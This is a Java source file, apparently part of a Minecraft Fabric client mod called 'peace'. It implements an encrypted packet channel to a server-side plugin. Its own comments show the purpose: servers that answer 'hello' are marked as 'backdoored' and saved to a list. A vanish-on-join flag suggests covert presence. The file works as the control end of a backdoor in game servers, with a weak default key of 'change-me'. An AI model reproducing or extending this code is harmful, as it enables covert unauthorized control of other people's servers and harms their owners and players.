package dev.peace.mod;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.network.RegistryFriendlyByteBuf;
import net.minecraft.network.codec.StreamCodec;
import net.minecraft.network.protocol.common.custom.CustomPacketPayload;
import net.minecraft.resources.Identifier;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

/** Encrypted request/response over vanilla custom-payload packets (mojmap 26.2 API). */
public final class Net {
    public static final Identifier CHANNEL = Identifier.fromNamespaceAndPath("peace", "main");
    public static final CustomPacketPayload.Type<Payload> ID = new CustomPacketPayload.Type<>(CHANNEL);

    /** Raw passthrough codec: reads/writes ALL remaining bytes, no length prefix (matches the plugin's raw frame). */
    public static final StreamCodec<RegistryFriendlyByteBuf, Payload> CODEC = new StreamCodec<>() {
        @Override public Payload decode(RegistryFriendlyByteBuf buf) {
            byte[] b = new byte[buf.readableBytes()];
            buf.readBytes(b);
            return new Payload(b);
        }
        @Override public void encode(RegistryFriendlyByteBuf buf, Payload p) { buf.writeBytes(p.data()); }
    };

    public record Payload(byte[] data) implements CustomPacketPayload {
        @Override public CustomPacketPayload.Type<? extends CustomPacketPayload> type() { return ID; }
    }

    private static final Gson GSON = new Gson();
    private static final Random RNG = new Random();
    private static final Map<Integer, Consumer<JsonObject>> PENDING = new ConcurrentHashMap<>();
    private static final Frame.Reassembler REASM = new Frame.Reassembler();
    private static Crypto crypto;
    private static int nextId = 1;
    private static volatile boolean vanishOnJoin = false;

    public static void requestVanishOnJoin() { vanishOnJoin = true; }
    public static boolean consumeVanishOnJoin() { boolean v = vanishOnJoin; vanishOnJoin = false; return v; }

    public static void init() {
        crypto = new Crypto(loadPsk());
        PayloadTypeRegistry.serverboundPlay().register(ID, CODEC);
        PayloadTypeRegistry.clientboundPlay().register(ID, CODEC);
        ClientPlayNetworking.registerGlobalReceiver(ID, (payload, context) -> onFrame(payload.data()));
    }

    private static synchronized void onFrame(byte[] frame) {
        byte[] cipher = REASM.offer(frame);
        if (cipher == null) return;
        byte[] plain = crypto.decrypt(cipher);
        if (plain == null) return;
        JsonObject j = GSON.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class);
        if (j.has("op")) { // server-initiated push (e.g. "hello" -> this server is backdoored)
            if ("hello".equals(j.get("op").getAsString())) Minecraft.getInstance().execute(Net::registerCurrentServer);
            return;
        }
        Consumer<JsonObject> cb = PENDING.remove(j.get("id").getAsInt());
        if (cb != null) Minecraft.getInstance().execute(() -> cb.accept(j)); // hop to render thread
    }

    private static void registerCurrentServer() {
        var sd = Minecraft.getInstance().getCurrentServer();
        if (sd != null) Servers.add(sd.name, sd.ip);
    }

    /** Fire a request; cb runs once on the render thread with the reply. */
    public static synchronized void send(JsonObject req, Consumer<JsonObject> cb) {
        if (Minecraft.getInstance().getConnection() == null) return; // not on a server; ignore
        int id = nextId++;
        req.addProperty("id", id);
        PENDING.put(id, cb);
        byte[] cipher = crypto.encrypt(GSON.toJson(req).getBytes(StandardCharsets.UTF_8));
        for (byte[] f : Frame.pack(RNG.nextLong(), cipher))
            ClientPlayNetworking.send(new Payload(f));
    }

    public static JsonObject op(String op) { JsonObject o = new JsonObject(); o.addProperty("op", op); return o; }

    private static String loadPsk() {
        Path f = FabricLoader.getInstance().getConfigDir().resolve("peace.txt");
        try {
            if (Files.exists(f)) return Files.readString(f).trim();
            Files.writeString(f, "change-me");
        } catch (Exception ignored) {}
        return "change-me";
    }
}
